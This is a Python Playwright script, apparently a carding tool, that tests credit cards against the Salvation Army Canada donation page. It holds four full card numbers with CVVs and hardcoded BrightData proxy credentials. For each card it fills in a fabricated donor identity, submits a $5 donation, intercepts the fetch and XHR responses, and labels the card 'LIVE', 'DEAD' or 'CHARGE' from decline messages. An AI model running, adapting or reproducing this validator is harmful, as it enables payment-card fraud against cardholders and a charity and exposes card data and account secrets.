#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Salvation Army Checker — Auto Run + Errors Extraction
"""

import re
import time
import json
import random
import os
from playwright.sync_api import sync_playwright

# ═══════════════════════════════════════════════════════════
# BrightData Config
# ═══════════════════════════════════════════════════════════

BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
BD_PASS = "eyr0v46j28pi"
BD_HOST = "brd.superproxy.io"
BD_PORT = "9222"

SALVATION_URL = "https://donate.salvationarmy.ca/page/63606/donate/3"

# ═══ البطاقات (تلقائي) ═══
CARDS = [
    "5104040287872188|12|2027|951",
    "5156786158125943|07|2028|829",
    "4970437821096395|06|2029|199",
    "4610460307961029|11|2028|549",
]

DELAY_BETWEEN_CARDS = 8
MAX_RESPONSE_WAIT = 40

# ═══════════════════════════════════════════════════════════
# Data
# ═══════════════════════════════════════════════════════════

FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"]

ADDRESSES = [
    {"a1": "1600 Amphitheatre Pkwy", "c": "Mountain View", "s": "CA", "z": "94043"},
    {"a1": "350 Fifth Avenue", "c": "New York", "s": "NY", "z": "10118"},
    {"a1": "233 S Wacker Dr", "c": "Chicago", "s": "IL", "z": "60606"},
    {"a1": "1 Microsoft Way", "c": "Redmond", "s": "WA", "z": "98052"},
]

# ═══════════════════════════════════════════════════════════
# Response Mapping
# ═══════════════════════════════════════════════════════════

REASON_MAP = {
    'InsufficientFunds': 'INSUFFICIENT_FUNDS',
    'CreditCardInsufficientFunds': 'INSUFFICIENT_FUNDS',
    'CreditCardInvalidAccount': 'INVALID_CARD',
    'CreditCardNumberInvalid': 'INVALID_CARD_NUMBER',
    'InvalidCardNumber': 'INVALID_CARD_NUMBER',
    'CreditCardExpired': 'EXPIRED_CARD',
    'ExpiredCard': 'EXPIRED_CARD',
    'CardExpired': 'EXPIRED_CARD',
    'CreditCardCVVInvalid': 'CVV_INVALID',
    'CVVInvalid': 'CVV_INVALID',
    'CreditCardDeclined': 'DECLINED',
    'Declined': 'DECLINED',
    'CardDeclined': 'DECLINED',
    'TransactionDeclined': 'DECLINED',
    'PaymentDeclined': 'DECLINED',
    'CreditCardDoNotHonor': 'DO_NOT_HONOR',
    'DoNotHonor': 'DO_NOT_HONOR',
    'CreditCardRestricted': 'RESTRICTED_CARD',
    'CreditCardLost': 'LOST_CARD',
    'CreditCardStolen': 'STOLEN_CARD',
    'CreditCardFraud': 'SUSPECTED_FRAUD',
    'SuspectedFraud': 'SUSPECTED_FRAUD',
    'CreditCardNotSupported': 'CARD_NOT_SUPPORTED',
    'Approved': 'CHARGE 1.0',
    'Success': 'CHARGE 1.0',
    'Charged': 'CHARGE 1.0',
    'Completed': 'CHARGE 1.0',
    'Authorized': 'CHARGE 1.0',
    'Captured': 'CHARGE 1.0',
}

# ═══ Patterns للـ Errors on this page: ═══
ERROR_PAGE_PATTERNS = [
    # Insufficient Funds
    (r"there are insufficient funds[^.]*\.", "INSUFFICIENT_FUNDS"),
    (r"insufficient funds[^.]*\.", "INSUFFICIENT_FUNDS"),
    (r"credit card has insufficient funds[^.]*\.", "INSUFFICIENT_FUNDS"),
    
    # Invalid Card
    (r"credit card account is invalid[^.]*\.", "INVALID_CARD"),
    (r"the credit card account is invalid[^.]*\.", "INVALID_CARD"),
    (r"your card is invalid[^.]*\.", "INVALID_CARD"),
    
    # Invalid Card Number
    (r"credit card number is invalid[^.]*\.", "INVALID_CARD_NUMBER"),
    (r"card number is invalid[^.]*\.", "INVALID_CARD_NUMBER"),
    (r"the card number is invalid[^.]*\.", "INVALID_CARD_NUMBER"),
    (r"invalid credit card number[^.]*\.", "INVALID_CARD_NUMBER"),
    
    # Expired
    (r"entered date is in the past[^.]*\.", "EXPIRED_CARD"),
    (r"card has expired[^.]*\.", "EXPIRED_CARD"),
    (r"the card is expired[^.]*\.", "EXPIRED_CARD"),
    (r"expiration date is invalid[^.]*\.", "EXPIRED_CARD"),
    
    # CVV
    (r"security code is invalid[^.]*\.", "CVV_INVALID"),
    (r"security code is incorrect[^.]*\.", "CVV_INVALID"),
    (r"cvv is invalid[^.]*\.", "CVV_INVALID"),
    (r"the security code[^.]*invalid[^.]*\.", "CVV_INVALID"),
    
    # Declined
    (r"your card was declined[^.]*\.", "DECLINED"),
    (r"card was declined[^.]*\.", "DECLINED"),
    (r"transaction was declined[^.]*\.", "DECLINED"),
    (r"payment was declined[^.]*\.", "DECLINED"),
    (r"the transaction was declined[^.]*\.", "DECLINED"),
    
    # Do Not Honor
    (r"do not honor[^.]*\.", "DO_NOT_HONOR"),
    (r"do not honour[^.]*\.", "DO_NOT_HONOR"),
    
    # Restricted
    (r"restricted card[^.]*\.", "RESTRICTED_CARD"),
    (r"the card is restricted[^.]*\.", "RESTRICTED_CARD"),
    
    # Fraud
    (r"suspected fraud[^.]*\.", "SUSPECTED_FRAUD"),
    (r"fraudulent[^.]*\.", "SUSPECTED_FRAUD"),
    
    # Lost / Stolen
    (r"lost card[^.]*\.", "LOST_CARD"),
    (r"stolen card[^.]*\.", "STOLEN_CARD"),
    
    # Not Supported
    (r"card not supported[^.]*\.", "CARD_NOT_SUPPORTED"),
    (r"not supported[^.]*\.", "CARD_NOT_SUPPORTED"),
    
    # Generic errors
    (r"please enter a valid[^.]*\.", "INVALID_INPUT"),
    (r"this field is required[^.]*\.", "MISSING_FIELD"),
    
    # Success
    (r"thank you for your donation[^.]*\.", "CHARGE 1.0"),
    (r"your donation was successful[^.]*\.", "CHARGE 1.0"),
    (r"donation was successful[^.]*\.", "CHARGE 1.0"),
    (r"donation complete[^.]*\.", "CHARGE 1.0"),
    (r"thank you[^.]*donation[^.]*\.", "CHARGE 1.0"),
]


def extract_errors_section(page_text):
    """
    استخراج الرد من قسم Errors on this page:
    ده القسم المهم في الموقع ده
    """
    # ابحث عن القسم
    match = re.search(r'errors? on this page[:\s]*(.*?)(?:\n\n|$)', page_text, re.IGNORECASE | re.DOTALL)
    
    if not match:
        return None, None
    
    error_section = match.group(1).strip()
    print(f"   🔎 [Errors section]: {error_section[:200]}", flush=True)
    
    # ابحث عن patterns
    error_lower = error_section.lower()
    for pattern, code in ERROR_PAGE_PATTERNS:
        m = re.search(pattern, error_lower)
        if m:
            return code, m.group(0).strip()[:200]
    
    # لو مفيش pattern مطابق، ارجع النص نفسه
    return f"RAW: {error_section[:150]}", error_section[:200]


def extract_api_response(responses):
    """استخراج من API"""
    for resp in reversed(responses):
        url = resp.get('url', '')
        body = resp.get('body', '')
        if not body:
            continue
        if any(x in url for x in ['.js', '.css', '.png', '.jpg', '.woff', '.svg']):
            continue
        if any(x in url for x in ['/order', '/payment', '/donate', '/charge', '/transaction', '/api', '/submit']):
            try:
                data = json.loads(body)
                reason = data.get('reason', '')
                description = data.get('description', '')
                if reason:
                    mapped = REASON_MAP.get(reason, reason)
                    return mapped, f"{reason}: {description}"[:200]
                if description:
                    return description[:200], description[:200]
                if 'error' in data:
                    err = data['error']
                    if isinstance(err, dict):
                        msg = err.get('message', '') or err.get('code', '')
                        if msg:
                            return msg[:200], msg[:200]
                    elif isinstance(err, str):
                        return err[:200], err[:200]
            except:
                if 'insufficient' in body.lower():
                    return "INSUFFICIENT_FUNDS", body[:200]
                if 'declined' in body.lower():
                    return "DECLINED", body[:200]
                if 'approved' in body.lower() or 'success' in body.lower():
                    return "CHARGE 1.0", body[:200]
    return None, None


def extract_text_response(page_text):
    """استخراج من أي نص في الصفحة"""
    text_lower = page_text.lower()
    
    # ═══ أولاً: ابحث في قسم Errors on this page ═══
    code, text = extract_errors_section(page_text)
    if code:
        return code, text
    
    # ═══ ثانياً: ابحث في كل الصفحة ═══
    for pattern, code in ERROR_PAGE_PATTERNS:
        m = re.search(pattern, text_lower)
        if m:
            return code, m.group(0).strip()[:200]
    
    return None, None


# ═══════════════════════════════════════════════════════════
# BrightData Connection
# ═══════════════════════════════════════════════════════════

def connect_browser(p):
    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
    print("🌐 Connecting to BrightData...", flush=True)
    browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)
    print("✅ Connected\n", flush=True)
    return browser


# ═══════════════════════════════════════════════════════════
# Check Card
# ═══════════════════════════════════════════════════════════

def check_card(browser, card, idx, total):
    t0 = time.time()
    result_code = "UNKNOWN"
    result_text = ""
    
    parts = card.strip().split("|")
    if len(parts) < 4:
        return ("INVALID_FORMAT", "Bad format", 0)
    
    num, mm, yy, cvv = parts[0], parts[1].zfill(2), parts[2], parts[3]
    if len(yy) == 2:
        yy = "20" + yy
    
    print(f"{'═'*60}", flush=True)
    print(f"🔍 [{idx}/{total}] {num[:6]}****{num[-4:]}", flush=True)
    print(f"{'═'*60}", flush=True)
    
    context = None
    try:
        context = browser.new_context(
            viewport={"width": 1366, "height": 900},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
        )
        page = context.new_page()
        
        # ═══ Intercept Responses ═══
        page.add_init_script("""
            window.__all_responses = [];
            const origFetch = window.fetch;
            window.fetch = async function(...args) {
                const response = await origFetch.apply(this, args);
                const url = typeof args[0] === 'string' ? args[0] : (args[0]?.url || '');
                try {
                    const clone = response.clone();
                    const body = await clone.text();
                    window.__all_responses.push({url, status: response.status, body});
                } catch(e) {}
                return response;
            };
            const origOpen = XMLHttpRequest.prototype.open;
            const origSend = XMLHttpRequest.prototype.send;
            XMLHttpRequest.prototype.open = function(m, u) {
                this.__url = u;
                return origOpen.apply(this, arguments);
            };
            XMLHttpRequest.prototype.send = function() {
                this.addEventListener('load', function() {
                    window.__all_responses.push({
                        url: this.__url || '',
                        status: this.status,
                        body: this.responseText || ''
                    });
                });
                return origSend.apply(this, arguments);
            };
        """)
        
        # ═══ Load Page ═══
        print("📄 [1/6] Loading page...", flush=True)
        page.goto(SALVATION_URL, timeout=90000, wait_until="domcontentloaded")
        time.sleep(4)
        print(f"   ✅ Page loaded ({page.url[:60]})", flush=True)
        
        # ═══ Wait for card form ═══
        print("🔎 [2/6] Waiting for card form...", flush=True)
        try:
            page.wait_for_selector("#cardNumber, input[name='cardNumber'], input[autocomplete='cc-number']", 
                                    timeout=25000, state="visible")
            print("   ✅ Form ready", flush=True)
        except:
            print("   ⚠️ Form not found, retrying...", flush=True)
            time.sleep(3)
            try:
                page.wait_for_selector("#cardNumber, input[name='cardNumber']", timeout=15000, state="visible")
                print("   ✅ Form ready (retry)", flush=True)
            except:
                print("   ❌ No form found", flush=True)
                # احفظ HTML للتشخيص
                try:
                    html = page.content()
                    with open(f"debug_card_{idx}.html", "w", encoding="utf-8") as f:
                        f.write(html)
                    print(f"   💾 Saved: debug_card_{idx}.html", flush=True)
                except:
                    pass
                try:
                    context.close()
                except:
                    pass
                return ("NO_FORM", "Form not found", round(time.time() - t0, 1))
        
        # ═══ Generate identity ═══
        f = random.choice(FIRST_NAMES)
        l = random.choice(LAST_NAMES)
        em = f"{f.lower()}.{l.lower()}{random.randint(100,999)}@gmail.com"
        ad = random.choice(ADDRESSES)
        ph = f"{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
        
        print(f"📝 [3/6] Filling form ({f} {l})...", flush=True)
        
        # ═══ Fill with fallback selectors ═══
        def try_fill(value, *sels):
            for sel in sels:
                try:
                    el = page.query_selector(sel)
                    if el and el.is_visible():
                        el.fill(value)
                        return True, sel
                except:
                    continue
            return False, None
        
        # Card number
        ok, sel = try_fill(num, "#cardNumber", "input[name='cardNumber']", "input[autocomplete='cc-number']")
        print(f"   Card Number: {'✅' if ok else '❌'} {sel or ''}", flush=True)
        
        # Expiry month
        ok, sel = try_fill(mm, "#expMonth", "select[name='expMonth']", "input[name='expMonth']")
        print(f"   Exp Month:   {'✅' if ok else '❌'} {sel or ''}", flush=True)
        
        # Expiry year
        ok, sel = try_fill(yy[2:] if len(yy) == 4 else yy, "#expYear", "select[name='expYear']", "input[name='expYear']")
        print(f"   Exp Year:    {'✅' if ok else '❌'} {sel or ''}", flush=True)
        
        # CVV
        ok, sel = try_fill(cvv, "#cardCvv2", "input[name='cardCvv2']", "input[autocomplete='cc-csc']")
        print(f"   CVV:         {'✅' if ok else '❌'} {sel or ''}", flush=True)
        
        # Amount
        try:
            page.fill("#donationAmountOther", "5")
            print(f"   Amount $5:   ✅", flush=True)
        except:
            print(f"   Amount $5:   ⚠️", flush=True)
        
        # Personal info
        try_fill(f, "#firstName", "input[name='firstName']")
        try_fill(l, "#lastName", "input[name='lastName']")
        try_fill(em, "#email", "input[name='email']", "input[type='email']")
        try_fill(ad["a1"], "#address1", "input[name='address1']")
        try_fill(ad["c"], "#city", "input[name='city']")
        
        try:
            page.select_option("#stateProvince", ad["s"])
        except:
            pass
        
        try_fill(ad["z"], "#zipPostalCode", "input[name='zipPostalCode']")
        try_fill(ph, "#phoneNumber", "input[name='phoneNumber']")
        
        print(f"   ✅ Personal filled", flush=True)
        time.sleep(0.5)
        
        # ═══ Click Donate ═══
        print("👆 [4/6] Clicking Donate...", flush=True)
        clicked = False
        for btn in ['#donateButton', 'button[type="submit"]', 'button:has-text("Donate")']:
            try:
                el = page.query_selector(btn)
                if el and el.is_visible():
                    el.click()
                    print(f"   ✅ Clicked: {btn}", flush=True)
                    clicked = True
                    break
            except:
                continue
        
        if not clicked:
            print(f"   ⚠️ No Donate button found", flush=True)
        
        # ═══ Wait for response ═══
        print("⏳ [5/6] Waiting for response...", flush=True)
        for i in range(MAX_RESPONSE_WAIT):
            time.sleep(1)
            
            # From API
            try:
                responses = page.evaluate("() => window.__all_responses || []")
                code, text = extract_api_response(responses)
                if code:
                    result_code = code
                    result_text = text
                    print(f"   ✅ Got from API ({i+1}s)", flush=True)
                    break
            except:
                pass
            
            # From Text
            try:
                page_text = page.inner_text("body")
                
                # ابحث أولاً في قسم errors
                code, text = extract_errors_section(page_text)
                if code:
                    result_code = code
                    result_text = text
                    print(f"   ✅ Got from Errors section ({i+1}s)", flush=True)
                    break
                
                # ثانياً: أي pattern
                code, text = extract_text_response(page_text)
                if code:
                    result_code = code
                    result_text = text
                    print(f"   ✅ Got from page text ({i+1}s)", flush=True)
                    break
            except:
                pass
            
            # Progress
            if (i + 1) % 5 == 0:
                print(f"   ... {(i+1)}s", flush=True)
        
        # ═══ Save final HTML for debug ═══
        print("💾 [6/6] Saving HTML...", flush=True)
        try:
            html = page.content()
            with open(f"result_card_{idx}.html", "w", encoding="utf-8") as f:
                f.write(html)
            print(f"   ✅ Saved: result_card_{idx}.html", flush=True)
        except:
            pass
        
        try:
            context.close()
        except:
            pass
    
    except Exception as e:
        print(f"❌ Error: {str(e)[:120]}", flush=True)
        result_code = f"ERR: {str(e)[:60]}"
        result_text = str(e)[:100]
        if context:
            try:
                context.close()
            except:
                pass
    
    elapsed = round(time.time() - t0, 1)
    print(f"\n📝 {result_code}", flush=True)
    if result_text:
        print(f"   💬 {result_text}", flush=True)
    print(f"⏱️  {elapsed}s", flush=True)
    
    return (result_code, result_text, elapsed)


# ═══════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════

def main():
    print("=" * 60, flush=True)
    print("  🎗️  Salvation Army Checker — AUTO RUN", flush=True)
    print("=" * 60, flush=True)
    print(f"  📊 Cards: {len(CARDS)}", flush=True)
    print(f"  ⏸️  Delay: {DELAY_BETWEEN_CARDS}s", flush=True)
    print("=" * 60, flush=True)
    print()
    
    for i, c in enumerate(CARDS, 1):
        print(f"  {i}. {c}", flush=True)
    print()
    
    results = []
    t_start = time.time()
    
    try:
        with sync_playwright() as p:
            browser = connect_browser(p)
            
            for idx, card in enumerate(CARDS, 1):
                try:
                    code, text, elapsed = check_card(browser, card, idx, len(CARDS))
                except Exception as e:
                    print(f"❌ Card error: {str(e)[:100]}", flush=True)
                    code, text, elapsed = f"ERR: {str(e)[:60]}", str(e)[:100], 0
                
                results.append({
                    'card': card,
                    'code': code,
                    'text': text,
                    'elapsed': elapsed,
                })
                
                if idx < len(CARDS):
                    print(f"⏸️  Waiting {DELAY_BETWEEN_CARDS}s...\n", flush=True)
                    time.sleep(DELAY_BETWEEN_CARDS)
            
            try:
                browser.close()
            except:
                pass
    
    except Exception as e:
        print(f"❌ Main error: {str(e)[:200]}", flush=True)
    
    total_time = round(time.time() - t_start, 1)
    
    # ═══ FINAL RESULTS ═══
    print("\n" + "=" * 60, flush=True)
    print("📊 النتائج النهائية", flush=True)
    print("=" * 60, flush=True)
    
    live_count = 0
    dead_count = 0
    error_count = 0
    charge_count = 0
    
    live_codes = [
        'INSUFFICIENT_FUNDS', 'DECLINED', 'EXPIRED_CARD', 'CVV_INVALID',
        'INVALID_CARD', 'INVALID_CARD_NUMBER', 'DO_NOT_HONOR',
        'RESTRICTED_CARD', 'SUSPECTED_FRAUD', 'LOST_CARD', 'STOLEN_CARD',
        'CARD_NOT_SUPPORTED', 'CHARGE 1.0'
    ]
    
    for r in results:
        card = r['card']
        code = r['code']
        text = r['text']
        elapsed = r['elapsed']
        
        if code == 'CHARGE 1.0':
            status = "🔥 CHARGE $1"
            charge_count += 1
            live_count += 1
        elif code in live_codes:
            status = "✅ LIVE"
            live_count += 1
        elif code.startswith('ERR') or code.startswith('RAW') or code in ['NO_RESPONSE', 'NO_FORM', 'SERVER_ERROR', 'UNKNOWN', 'INVALID_INPUT', 'MISSING_FIELD']:
            status = "⚠️ ERROR"
            error_count += 1
        else:
            status = "❌ DEAD"
            dead_count += 1
        
        print(f"\n💳 {card}", flush=True)
        print(f"   📝 {code}", flush=True)
        if text:
            print(f"   💬 {text}", flush=True)
        print(f"   {status} | ⏱️ {elapsed}s", flush=True)
    
    print("\n" + "=" * 60, flush=True)
    print(f"🔥 Charge:  {charge_count}", flush=True)
    print(f"✅ Live:    {live_count}", flush=True)
    print(f"❌ Dead:    {dead_count}", flush=True)
    print(f"⚠️  Errors:  {error_count}", flush=True)
    print(f"⏱️  Total:   {total_time}s ({round(total_time/60, 1)} min)", flush=True)
    print("=" * 60, flush=True)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Stopped", flush=True)
    except Exception as e:
        print(f"\n❌ Error: {str(e)[:200]}", flush=True)
